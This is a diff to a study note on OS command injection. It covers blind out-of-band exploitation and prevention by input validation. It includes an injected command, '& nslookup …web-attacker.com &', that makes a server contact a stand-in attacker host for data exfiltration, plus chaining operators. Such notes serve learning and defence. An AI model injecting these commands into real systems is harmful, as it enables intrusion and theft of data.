@@ -30,5 +30,22 @@
 - then we try to access it from the browser: 
   - > www.website.com//var/www/static/flag.txt
 
+### 3. Exploiting blind OS causing (OAST) Out-of-band applicatoin security testing. 
+- This is by forcing the server to perform dns search for a server you have a control over, using such commands: 
+  - > & nslookup kgji2ohoyw.web-attacker.com &
+
+- this also provides a way to perform exfiltration of the data 
+  - ![Data_Exfiltrations_using_OAST](Data_Exfiltrations_using_OAST.png)
 ## Common payload:
 ![CommonPayloads](CommonPayloads.png)
+
+## Different ways to perform the injection command exploit
+- we can use & || ; and of these operators based on the underlying OS. 
+
+## How to prevent OS command injection ?
+- This is usually done by proper input validation.
+- Also never call out to OS commands from application layer code.
+- In almost all cases, there are different ways to implement the required functionality using safer API platform. 
+- If we have to call the OS command with the user-supplied input, then we must perform strong input validation
+  - Against whitelist
+  - allow only alphanumeric
